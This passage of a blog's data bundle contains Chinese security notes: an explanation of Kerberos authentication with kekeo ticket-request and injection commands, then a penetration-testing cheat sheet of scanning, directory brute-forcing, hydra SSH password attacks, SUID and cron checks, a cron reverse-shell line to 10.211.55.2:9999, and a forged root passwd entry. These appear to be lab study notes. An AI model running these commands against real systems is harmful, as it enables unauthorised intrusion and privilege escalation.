Server\uff09\uff1a\u8ba4\u8bc1\u670d\u52a1\u5668**\uff0c\u4e13\u95e8\u7528\u6765\u8ba4\u8bc1\u5ba2\u6237\u7aef\u7684\u8eab\u4efd\u5e76\u53d1\u653e\u5ba2\u6237\u7528\u4e8e\u8bbf\u95eeTGS\u7684**TGT\uff08\u7968\u636e\u6388\u4e88\u7968\u636e\uff09** \\r\\n\\r\\n\u200b\\t\\t**TGS\uff08Ticket Granting Ticket\uff09\uff1a\u7968\u636e\u6388\u4e88\u670d\u52a1\u5668**\uff0c\u7528\u6765\u53d1\u653e\u6574\u4e2a\u8ba4\u8bc1\u8fc7\u7a0b\u4ee5\u53ca\u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u7aef\u65f6\u6240\u9700\u7684\u670d\u52a1\u6388\u4e88\u7968\u636e\uff08Ticket\uff09\\r\\n\\r\\n### kerberos\u534f\u8bae\u8ba4\u8bc1\u6d41\u7a0b\\r\\n\\r\\n\u4f8b\u5982\uff1a**\u53bb\u52a8\u7269\u56ed\u662f\u4ec0\u4e48\u6d41\u7a0b\uff1f**\\r\\n\\r\\n\u200b\\t\u7b2c\u4e00\u6b65\uff1a\u5f20\u4e09\uff08\u5ba2\u6237\u7aef\uff09\u62ff\u7740\u8eab\u4efd\u8bc1\u53bb**AS**\u8ba4\u8bc1\uff0c\u8ba4\u8bc1\u901a\u8fc7\u540e\u8fd4\u56de\u4e00\u5f20\u53bb\u5356\u7968\u7a97\u53e3\u4e70\u7968\u7684\u7968\uff08TGT\uff09 \\r\\n\\r\\n![image-20250406224913296](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406224913296.png)\\r\\n\\r\\n\u7b2c\u4e8c\u6b65\uff1a\u5f20\u4e09\uff08\u5ba2\u6237\u7aef\uff09\u62ff\u7740**TGT**\u53bb\u5356\u7968\u7a97\u53e3(**TGS**)\u4e70\u4e00\u5f20\u53bb\u52a8\u7269\u56ed\u7684\u7968\uff0c\u5e76\u62ff\u5230\u4e00\u5f20**ST**\\r\\n\\r\\n![image-20250406225036871](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406225036871.png)\\r\\n\\r\\n\u7b2c\u4e09\u6b65\uff1a\u5f20\u4e09\uff08\u5ba2\u6237\u7aef\uff09\u62ff\u7740ST\u53bb\u52a8\u7269\u56ed \\r\\n\\r\\n![image-20250406225147891](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406225147891.png)\\r\\n\\r\\n\u8ba1\u7b97\u673a\u4e2d\u662f\u5982\u4f55\u5b9e\u73b0kerberos\u8ba4\u8bc1\u7684\u5462\uff1f\\r\\n![image-20250406224552222](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406224552222.png)\\r\\n\\r\\n### kerberos\u8ba4\u8bc1-\u5ba2\u6237\u7aef\u548cAS\u901a\u4fe1\u539f\u7406\\r\\n\\r\\n\u7b2c\u4e00\u6b65\uff1a\u5ba2\u6237\u7aef\u62ff\u7740**\u8eab\u4efd\u4fe1\u606f**\u53bbAS\uff08\u8ba4\u8bc1\u670d\u52a1\u5668\uff09\u8ba4\u8bc1\uff0c\u8ba4\u8bc1\u901a\u8fc7\u540e\u8fd4\u56de\u4e00\u5f20\u53bb\u5356\u7968\u7a97\u53e3\u4e70\u7968\u7684\u7968\uff08**TGT**\uff09\u5373 \u7968\u636e\u6388\u4e88\u7968\u636e\\r\\n\\r\\n\u8eab\u4efd\u4fe1\u606f\u548cTGT\u5185\u5bb9\uff0c\u5982\u4e0b\u56fe\uff1a\\r\\n\\r\\n![](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406225735981.png)\\r\\n\\r\\n**krbtgt\u7528\u6237**\uff0c\u662f\u7cfb\u7edf\u5728\u521b\u5efa\u57df\u65f6\u81ea\u52a8\u751f\u6210\u7684\u4e00\u4e2a\u5e10\u53f7\uff0c\u5176\u4f5c\u7528\u662f\u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3\u7684\u670d\u52a1\u8d26\u53f7\uff0c\u5176\u5bc6\u7801\u662f\u7cfb\u7edf\u968f\u673a\u751f\u6210 \u7684\uff0c\u65e0\u6cd5\u767b\u5f55\u4e3b\u673a\u3002\\r\\n\\r\\n\u63d0\u4f9b\u8eab\u4efd\u4fe1\u606f\u7684\u6570\u636e\u5305\u662fAS-REQ(AS-requests)\uff1b\u53d1\u9001TGT\u7684\u6570\u636e\u5305\u662fAS-REP(AS-response) \u3002\\r\\n\\r\\n\u5f53\u7528\u6237\u6536\u5230TGT\u65f6\u5019\u5bf9TGT\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u4e14\u91cd\u65b0\u5c01\u88c5\u4e00\u4e2aTGT\\r\\n\\r\\n**\u6d41\u7a0b\u63cf\u8ff0**\uff1a\u5ba2\u670d\u7aef\u6536\u5230AS\u53d1\u8fc7\u6765\u7684TGT\uff0c\u4f7f\u7528\u7528\u6237hash\u8fdb\u884c\u89e3\u5bc6\uff0c\u62ff\u5230`CT_SK`\u7b49\u4fe1\u606f\uff0c\u56e0\u4e3a\u4e0d\u77e5\u9053`krbtgt`\u7528\u6237\u7684hash\uff0c\u6240\u4ee5\u7b2c\u4e8c\u90e8\u5206\u4e0d\u53d8\uff0c\u63a5\u7740\u6dfb\u52a0\u9700\u8981\u8bbf\u95ee\u7684\u670d\u52a1\u7684\u540d\u79f0\u5373`servername`\uff0c\u8fd9\u4e09\u90e8\u5206\u5c01\u88c5\u8d77\u6765\uff0c\u7ec4\u6210\u65b0\u7684TGT\\r\\n\\r\\n![image-20250406230408420](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406230408420.png)\\r\\n\\r\\n### kerberos\u8ba4\u8bc1-\u5ba2\u6237\u7aef\u548cTGS\u901a\u4fe1\u539f\u7406\\r\\n\\r\\n\u7b2c\u4e8c\u6b65\uff1a\u5ba2\u6237\u7aef\u62ff\u7740TGT\u53bb\u5356\u7968\u7a97\u53e3(TGS)\u4e70\u4e00\u5f20\u53bb\u52a8\u7269\u56ed\u7684\u7968\\r\\n\\r\\n**\u6d41\u7a0b\u63cf\u8ff0\uff1a**\u5ba2\u6237\u7aef\u62ff\u7740\u91cd\u65b0\u5c01\u88c5\u7684TGT\uff0c\u53bb\u627eTGS\uff0cTGS\u5ba1\u6838\u65e0\u8bef\u540e\uff0c\u8fd4\u56de\u4e00\u5f20`ST`\u7ed9\u5ba2\u6237\u7aef\\r\\n\\r\\nST\u7ec4\u6210\uff1a\u4e0d\u518d\u4f7f\u7528`krbtgt`\u7684hash\uff0c\u800c\u662f\u4f7f\u7528`server hash`\u8fdb\u884c\u52a0\u5bc6\\r\\n\\r\\n![image-20250406231325418](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406231325418.png)\\r\\n\\r\\n### kerberos\u8ba4\u8bc1-\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u901a\u4fe1\u539f\u7406\\r\\n\\r\\n\u7b2c\u4e09\u6b65\uff1a\u5ba2\u6237\u7aef\u62ff\u7740ST\u53bb\u52a8\u7269\u56ed\\r\\n\\r\\n**\u6d41\u7a0b\u63cf\u8ff0\uff1a**\u5ba2\u6237\u7aef\u6536\u5230TGS\u53d1\u9001\u7684ST\u4e4b\u540e\uff0c\u4f7f\u7528`CT_SK`\u5bf9\u5176\u8fdb\u884c\u89e3\u5bc6\uff0c\u62ff\u5230`CS_SK`\uff0c\u7136\u540e\u91cd\u65b0\u5c01\u88c5\u7b2c\u4e00\u90e8\u5206\u5185\u5bb9\uff0c\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\\r\\n\\r\\n![image-20250406231703728](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406231703728.png)\\r\\n\\r\\n### kerberos\u8ba4\u8bc1-AS-REQ\u548cAS-REP\u6570\u636e\u5305\u5206\u6790\\r\\n\\r\\n\u63d0\u4f9b\u8eab\u4efd\u4fe1\u606f\u7684\u6570\u636e\u5305\u662fAS-REQ(AS-requests) \\r\\n\\r\\n\u53d1\u9001TGT\u7684\u6570\u636e\u5305\u662fAS-REP(AS-response)\\r\\n\\r\\n\u63d0\u4f9b\u8eab\u4efd\u4fe1\u606f\uff0c\u6211\u4eec\u4f7f\u7528kekeo\u8fdb\u884c\u7533\u8bf7TGT\uff0c\u5e76\u4e14\u4f7f\u7528wireshark\u8fdb\u884c\u6293\u5305\u5206\u6790\\r\\n\\r\\n```\\r\\nTgt::ask /user:\u57df\u7528\u6237 /domain:\u57df\u540d /password:\u5bc6\u7801\\r\\n```\\r\\n\\r\\n![image-20250406232245843](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406232245843.png)\\r\\n\\r\\n![image-20250406232356994](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406232356994.png)\\r\\n\\r\\n**AS-REQ(AS-requests)**:\u4e3b\u8981\u5305\u542b\u4e86\u7528\u6237\u7684\u4e00\u4e9b\u4fe1\u606f\uff0c\u662f\u7531\u5ba2\u6237\u7aef\u53d1\u9001\u7ed9AS\u7684\u6570\u636e\u5305\u3002\u91cc\u9762\u6709\u51e0\u4e2a\u91cd\u8981\u4fe1\u606f \\r\\n\\r\\n1\u3001 PA-DATA pA-ENC-TIMESTAMP \u4f7f\u7528\u7528\u6237\u7684hash,\u6216\u8005AES key\u52a0\u5bc6\u65f6\u95f4\u6233 \u751f\u6210value \\r\\n\\r\\n\u200b\\tPA-DATA pA-PAC-REQUEST\uff0c\u662f\u5426\u5305\u542b\u4e86PAC \\r\\n\\r\\n2\u3001 kdc-options \u534f\u5546\u5b57\u6bb5 \\r\\n\\r\\n3\u3001 cname \u8bf7\u6c42\u7684\u7528\u6237\u540d \\r\\n\\r\\n5\u3001 realm: \u57df\u540d \\r\\n\\r\\n6\u3001 sname \u8bf7\u6c42\u7684\u670d\u52a1\u540d\\r\\n\\r\\n![image-20250406232717633](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406232717633.png)\\r\\n\\r\\n**AS-REP(AS-Response)**:\u5f53KDC\u6536\u5230AS-REQ\u4e4b\u540e\u89e3\u5bc6**PA-DATA pA-ENC-TIMESTAMP** \u5982\u679c\u6210\u529f\u5c31\u8fd4\u56deAS-REP \\r\\n\\r\\n1\u3001enc-part\uff1aTGT\u4e2d\u7531KRBTGT\u54c8\u5e0c\u503c\u52a0\u5bc6\u90e8\u5206\\r\\n\\r\\n2\u3001enc-part\uff1aTGT\u4e2d\u7531\u7528\u6237\u54c8\u5e0c\u503c\u52a0\u5bc6\u90e8\u5206\\r\\n\\r\\n![image-20250406233040218](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406233040218.png)\\r\\n\\r\\n### kerberos\u8ba4\u8bc1-TGS-REQ\u548cTGS-REP\u6570\u636e\u5305\u5206\u6790\\r\\n\\r\\n**TGS-REQ\uff1a\u5ba2\u6237\u7aef\u53d1\u9001\u7ed9TGS\u6570\u636e\u5305** \\r\\n\\r\\n**TGS-REP\uff1aTGS\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u6570\u636e\u5305**\\r\\n\\r\\n```\\r\\ntgs::ask /tgt:tgt\u7968\u636e /service:\u670d\u52a1\u540d/\u57df\u540d\u5730\u5740\\r\\n```\\r\\n\\r\\n![image-20250406233208084](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406233208084.png)\\r\\n\\r\\n![image-20250406233234872](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406233234872.png)\\r\\n\\r\\n```\\r\\nklist\\r\\n```\\r\\n\\r\\n\u67e5\u770b\u7968\u636e\u4fe1\u606f\\r\\n\\r\\n![image-20250406233449812](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406233449812.png)\\r\\n\\r\\n![](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406233810830.png)\\r\\n\\r\\n**TGS-REQ\uff1a\u5ba2\u6237\u7aef\u53d1\u9001\u7ed9TGS\u6570\u636e\u5305\uff0c\u5176\u4e2d\u5305\u542b\u5927\u4f53\u5982\u4e0b\uff1a** \\r\\n\\r\\n1\u3001authenticator\uff1a\u4f7f\u7528CT_SK\u52a0\u5bc6\u5185\u5bb9 \\r\\n\\r\\n2\u3001ticket\uff1a\u539f\u59cb\u7684TGT\u4f7f\u7528krbtgt\u52a0\u5bc6 \\r\\n\\r\\n3\u3001cname\uff1a\u8bf7\u6c42\u7528\u6237\u540d \\r\\n\\r\\n4\u3001sname\uff1a\u8bf7\u6c42\u670d\u52a1\u540d\\r\\n\\r\\n![image-20250406234007515](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406234007515.png)\\r\\n\\r\\n**TGS-REP \uff1aTGS\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u5176\u4e2d\u5305\u542b\u5927\u4f53\u5982\u4e0b,** \\r\\n\\r\\n1\u3001ticket:\u5185\u5bb9 \\r\\n\\r\\n2\u3001enc-part\uff1aticket\u4e2d\u7684part\u662f\u4f7f\u7528\u670d\u52a1\u79d8\u94a5\u52a0\u5bc6\u5185\u5bb9 \\r\\n\\r\\n3\u3001enc-part\uff1a\u5916\u5c42\u7684part\u662f\u4f7f\u7528CT_SK\u52a0\u5bc6\\r\\n\\r\\n![image-20250406234102771](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250406234102771.png)\\r\\n\\r\\n### kerberos\u8ba4\u8bc1-AP-REQ\u548cAP-REP\u6570\u636e\u5305\u5206\u6790\\r\\n\\r\\nAP-REQ\uff1a\u662f\u5ba2\u6237\u7aef\u53d1\u9001ST\u5230\u670d\u52a1\u7aef\u7684\u6570\u636e\\r\\n\\r\\nAP-REP\uff1a\u662f\u670d\u52a1\u7aef\u53d1\u9001\u5230\u5ba2\u6237\u7aef\u7684\u6570\u636e\uff08\u8fd9\u4e2a\u5305\u662f\u53ef\u9009\u7684\uff09\\r\\n\\r\\n```\\r\\nTgt::ask /user:\u57df\u7528\u6237 /domain:\u57df\u540d /password:\u5bc6\u7801 \u7533\u8bf7TGT \\r\\ntgs::ask /tgt:tgt\u7968\u636e /service:\u670d\u52a1\u540d/\u57df\u540d\u5730\u5740 /ptt \u7533\u8bf7ST\u5e76\u4e14\u6ce8\u5165\u5230\u5185\u5b58\\r\\n```\\r\\n\\r\\n\u6211\u4eec\u767b\u5f55ZS\u7684\u7535\u8111\uff0c\u7136\u540e\u4f7f\u7528administrator\u57df\u7ba1\u7684\u8d26\u53f7\u8fdb\u884c\u7533\u8bf7\u7968\u636e\uff0c\u56e0\u4e3a\u5982\u679c\u662f\u4f7f\u7528\u7684ZS\u6216\u8005WW\u7684\u8d26\u53f7\uff0c\u5c31\u7b97\u7968\u636e\u7533\u8bf7\u4e86\uff0c\u4e5f\u662f\u6ca1\u6709\u6743\u9650\u8bbf\u95ee\u5bf9\u65b9\u7535\u8111\u7684\u3002 \\r\\n\\r\\n![image-20250407194922080](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250407194922080.png)\\r\\n\\r\\n![image-20250407194942808](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250407194942808.png)\\r\\n\\r\\n\u67e5\u770b\u7968\u636e\\r\\n\\r\\n![image-20250407195416373](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250407195416373.png)\\r\\n\\r\\n\u6210\u529f\u8bbf\u95ee\u8be5\u670d\u52a1\\r\\n\\r\\n![image-20250407195007250](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250407195007250.png)\\r\\n\\r\\n![image-20250407200411709](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250407200411709.png)\\r\\n\\r\\n`ap-req`\u6570\u636e\u5305\\r\\n\\r\\n1\u3001ticket\uff1a\u91cc\u9762\u5305\u542b\u4e86\u4f7f\u7528\u670d\u52a1\u7aefhash\u52a0\u5bc6\u7684\u5185\u5bb9 \\r\\n\\r\\n2\u3001authenticator\uff1a\u5305\u542b\u4e86\u4f7f\u7528CS_SK\u52a0\u5bc6\u5185\u5bb9\\r\\n\\r\\n![](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250407200506479.png)\\r\\n\\r\\n`ap-rep`\u6570\u636e\u5305\\r\\n\\r\\n**AP-REP\uff0c\u662f\u670d\u52a1\u7aef\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u7684\u4fe1\u606f\uff0c\u5305\u542b\u4e86\u5ba2\u6237\u7aef\u9a8c\u8bc1\u670d\u52a1\u7aef\u7684\u4fe1\u606f**\\r\\n\\r\\n![image-20250407200608147](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250407200608147.png)\\r\\n\\r\\n### kerberos\u534f\u8bae\u5b89\u5168\u95ee\u9898\\r\\n\\r\\n`PTH`\u653b\u51fb\\r\\n\\r\\n\u57df\u5185\u7528\u6237\u679a\u4e3e\\r\\n\\r\\n\u5bc6\u7801\u55b7\u6d12\\r\\n\\r\\n\u9ec4\u91d1\u7968\u636e\\r\\n\\r\\n\u767d\u94f6\u7968\u636e\\r\\n\\r\\n![image-20250407200728838](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250407200728838.png)"},{"id":"Command","metadata":{"permalink":"/blog/Command","editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/blog/2024-10-09-command/\u5e38\u7528\u547d\u4ee4.md","source":"@site/blog/2024-10-09-command/\u5e38\u7528\u547d\u4ee4.md","title":"\u5e38\u7528\u547d\u4ee4","description":"\u4e3b\u673a\u53d1\u73b0","date":"2024-10-09T00:00:00.000Z","tags":[],"readingTime":2.575,"hasTruncateMarker":false,"authors":[{"name":"C0rr3ct","title":"Right?","url":"https://github.com/","imageURL":"https://avatars.githubusercontent.com/u/213068687","key":"C0rr3ct","page":null}],"frontMatter":{"slug":"Command","title":"\u5e38\u7528\u547d\u4ee4","authors":"C0rr3ct"},"unlisted":false,"prevItem":{"title":"\u5185\u7f51\u57fa\u7840\u77e5\u8bc6","permalink":"/blog/2024/11/11/tmux/\u5185\u7f51\u5b66\u4e60"},"nextItem":{"title":"Notice","permalink":"/blog/Notice"}},"content":"## \u4e3b\u673a\u53d1\u73b0\\r\\n\\r\\n### arp-scan\\r\\n\\r\\n```bash\\r\\narp-scan -l\\r\\n```\\r\\n\\r\\n### netdiscover\\r\\n\\r\\n\u6307\u5b9a\u7f51\u6bb5\u626b\u63cf\\r\\n\\r\\n```bash\\r\\nnetdiscover -r 192.168.56.0/24\\r\\n```\\r\\n\\r\\n\u6307\u5b9a\u7f51\u5361\u626b\u63cf\\r\\n\\r\\n```bash\\r\\nnetdiscover -i eth0 -r 192.168.56.0/24\\r\\n```\\r\\n\\r\\n## \u679a\u4e3e\\r\\n\\r\\n### nmap scan\\r\\n\\r\\n\u626b\u63cf\u5168\u7aef\u53e3\\r\\n\\r\\n```shell\\r\\nnmap -sT --min-rate=10000 -p- 192.168.56.1 -oN nmap_result/port\\r\\n```\\r\\n\\r\\n```shell\\r\\nsudo nmap -sU --min-rate 10000 -p- 192.168.56.1 -oN nmap_result/udp\\r\\n```\\r\\n\\r\\n\u526a\u5207\u5f00\u653e\u7aef\u53e3\\r\\n\\r\\n```shell\\r\\nnmap -p- --min-rate=10000 -T4 192.168.56.1 | grep ^[0-9] | cut -d \'/\' -f 1 | tr \'\\\\n\' \',\' | sed s/,$//\\r\\n```\\r\\n\\r\\n```shell\\r\\ncat nmap_result/port | grep \'open\' | awk -F\'/\' \'{print $1}\'| tr \\"\\\\n\\" \',\'\\r\\n```\\r\\n\\r\\n\u8be6\u7ec6\u626b\u63cf\\r\\n\\r\\n```shell\\r\\nsudo nmap -sT -sV -sC -O -p port -oN nmap_result/details 192.168.56.1\\r\\n```\\r\\n\\r\\n\u6f0f\u6d1e\u626b\u63cf\\r\\n\\r\\n```shell\\r\\nnmap --script=vuln 192.168.56.1 -p port -oN nmap_result/vuln \\r\\n```\\r\\n\\r\\n### web\\r\\n\\r\\n```\\r\\nnikto -h http://192.168.56.1\\r\\n```\\r\\n\\r\\n## TCP\u7684\u5168\u7aef\u53e3\u626b\u63cf\\r\\n\\r\\n```bash\\r\\nnmap -sT --min-rate 10000 -p- 192.168.56.122\\r\\n```\\r\\n\\r\\n## \u8be6\u7ec6\u626b\u63cf\u7aef\u53e3\\r\\n\\r\\n```bash\\r\\nnmap -sT -sV -sC -O -p21,22,80 192.168.56.122\\r\\n```\\r\\n\\r\\n## FTP\u533f\u540d\u767b\u5f55\\r\\n\\r\\n```bash\\r\\nftp 192.168.56.122\\r\\nanonymous\\r\\n```\\r\\n\\r\\n## SSH\u767b\u5f55\\r\\n\\r\\n\u7206\u7834\\r\\n\\r\\n```bash\\r\\nhydra -l renu -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt ssh://192.168.56.120\\r\\n```\\r\\n\\r\\n```bash\\r\\nssh w1r3s@192.168.56.127 -i id_rsa\\r\\n```\\r\\n\\r\\n## POP3\u767b\u5f55\\r\\n\\r\\n\u767b\u5f55\\r\\n\\r\\n```\\r\\nUSER your_username\\r\\nPASS your_password\\r\\n```\\r\\n\\r\\n```\\r\\n\u67e5\u770b\u90ae\u4ef6\u6570\u91cf\\r\\nSTAT\\r\\n\\r\\n\u83b7\u53d6\u90ae\u4ef6\u5217\u8868\\r\\nLIST\\r\\n\\r\\n\u67e5\u770b\u7279\u5b9a\u90ae\u4ef6\uff08\u4f8b\u5982\uff0c\u67e5\u770b\u7b2c\u4e00\u5c01\u90ae\u4ef6\uff09\\r\\nRETR 1\\r\\n\\r\\n\u5220\u9664\u7279\u5b9a\u90ae\u4ef6\uff08\u4f8b\u5982\uff0c\u5220\u9664\u7b2c\u4e00\u5c01\u90ae\u4ef6\uff09\\r\\nDELE 1\\r\\n```\\r\\n\\r\\n```shell\\r\\n$ telnet pop.example.com 110\\r\\n+OK POP3 server ready\\r\\nUSER your_username\\r\\n+OK User name accepted\\r\\nPASS your_password\\r\\n+OK Password accepted\\r\\nSTAT\\r\\n+OK 3 2048\\r\\nLIST\\r\\n+OK 3 messages:\\r\\n1 1024\\r\\n2 1024\\r\\n3 512\\r\\nRETR 1\\r\\n+OK 1024 octets\\r\\n[\u90ae\u4ef6\u5185\u5bb9]\\r\\n.\\r\\nQUIT\\r\\n+OK Goodbye\\r\\n```\\r\\n\\r\\n## \u76ee\u5f55\u626b\u63cf\\r\\n\\r\\n### gobuster\\r\\n\\r\\n```bash\\r\\ngobuster dir -u http://192.168.56.122/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html\\r\\n```\\r\\n\\r\\n### dirsearch\\r\\n\\r\\n```bash\\r\\ndirsearch -u http://192.168.56.101 -w zidian.txt -e php\\r\\n```\\r\\n\\r\\n### dirb\\r\\n\\r\\n```bash\\r\\ndirb http://192.168.56.100 /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\\r\\n```\\r\\n\\r\\n```\\r\\ndirb http://192.168.56.1 -X .txt,.html,.tar,.zip,.php\\r\\n```\\r\\n\\r\\n### feroxbuster\\r\\n\\r\\n```bash\\r\\nferoxbuster --scan-limit 2 -t 1 --filter-status 404 -u http://192.168.56.108\\r\\n```\\r\\n\\r\\n### \u5b57\u5178\\r\\n\\r\\n`kali linux`\u4e2d\u81ea\u5e26\u7684\u4e00\u4e9b\u5b57\u5178\\r\\n\\r\\n```\\r\\n/usr/share/wordlists/dirbuster/directory-list-2.3-*.txt\\r\\n/usr/share/wordlists/dirbuster/directory-list-1.0.txt\\r\\n/usr/share/wordlists/dirb/big.txt\\r\\n/usr/share/wordlists/dirb/common.txt\\r\\n/usr/share/wordlists/dirb/small.txt\\r\\n/usr/share/wordlists/dirb/extensions_common.txt\\r\\n```\\r\\n\\r\\n\u8fd8\u6709`secLists`\u7684\u5b57\u5178\\r\\n\\r\\n```bash\\r\\napt install secLists\\r\\n```\\r\\n\\r\\n```\\r\\n/usr/share/seclists/\\r\\n```\\r\\n\\r\\n## \u63d0\u6743\\r\\n\\r\\n### \u5bfb\u627e\u7279\u6b8a\u7a0b\u5e8f\u80fd\u529b\\r\\n\\r\\n```bash\\r\\ngetcap -r / 2>/dev/null\\r\\n```\\r\\n\\r\\n### find\u67e5\u627esuid\u6743\u9650\u7684\u6587\u4ef6\\r\\n\\r\\n```bash\\r\\nfind / -type f -perm -4000 2>/dev/null\\r\\nfind / -perm -u=s -type f 2>/dev/null\\r\\n```\\r\\n\\r\\n### sudo\\r\\n\\r\\n```bash\\r\\n*/1 * * * *  /bin/sh -i >& /dev/tcp/10.211.55.2/9999 0>&1\\r\\n```\\r\\n\\r\\n### \u5b9a\u65f6\u4efb\u52a1\\r\\n\\r\\n```bash\\r\\ncat /etc/crontab\\r\\n```\\r\\n\\r\\n```shell\\r\\nls /var/spool/cron/crontabs/\\r\\n```\\r\\n\\r\\n### \u5185\u6838\\r\\n\\r\\n```bash\\r\\nuname -a\\r\\n```\\r\\n\\r\\n```bash\\r\\nlsb_release -a\\r\\n```\\r\\n\\r\\n### \u53ef\u5199\u6587\u4ef6\\r\\n\\r\\n```bash\\r\\nfind / -writable 2>/dev/null\\r\\n```\\r\\n\\r\\n**\u751f\u6210passwd\u5bc6\u7801**\\r\\n\\r\\n```shell\\r\\nopenssl passwd -1 -salt somesalt 123456 > hash.txt\\r\\ncorr:$1$somesalt$uGkN1R3BfqJr15hKXW5jt.:0:0::/root:/bin/bash\\r\\n```"},{"id":"Notice","metadata":{"permalink":"/blog/Notice","editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/blog/2024-05-16-welcome/index.md","source":"@site/blog/2024-05-16-welcome/index.md","title":"Notice","description":"Some content with Markdown syntax. Check this api.","date":"2024-05-16T00:00:00.000Z","tags":[],"readingTime":0.25,"hasTruncateMarker":false,"authors":[{"name":"C0rr3ct","title":"Right?","url":"https://github.com/","imageURL":"https://avatars.githubusercontent.com/u/213068687","key":"C0rr3ct","page":null}],"frontMatter":{"slug":"Notice","title":"Notice","authors":"C0rr3ct"},"unlisted":false,"prevItem":{"title":"\u5e38\u7528\u547d\u4ee4","permalink":"/blog/Command"}},"content":":::note\\n\\nSome **content** with _Markdown_ `syntax`. Check [this `api`](#).\\n\\n:::\\n\\n:::tip\\n\\nSome **content** with _Markdown_ `syntax`. Check [this `api`](#).\\n\\n:::\\n\\n:::info\\n\\nSome **content** with _Markdown_ `syntax`. Check [this `api`](#).\\n\\n:::\\n\\n:::warning\\n\\nSome **content** with _Markdown_ `syntax`. Check [this `api`](#).\\n\\n:::\\n\\n:::danger\\n\\nSome **content** with _Markdown_ `syntax`. Check [this `api`](#).\\n\\n:::"}]}}')}}]);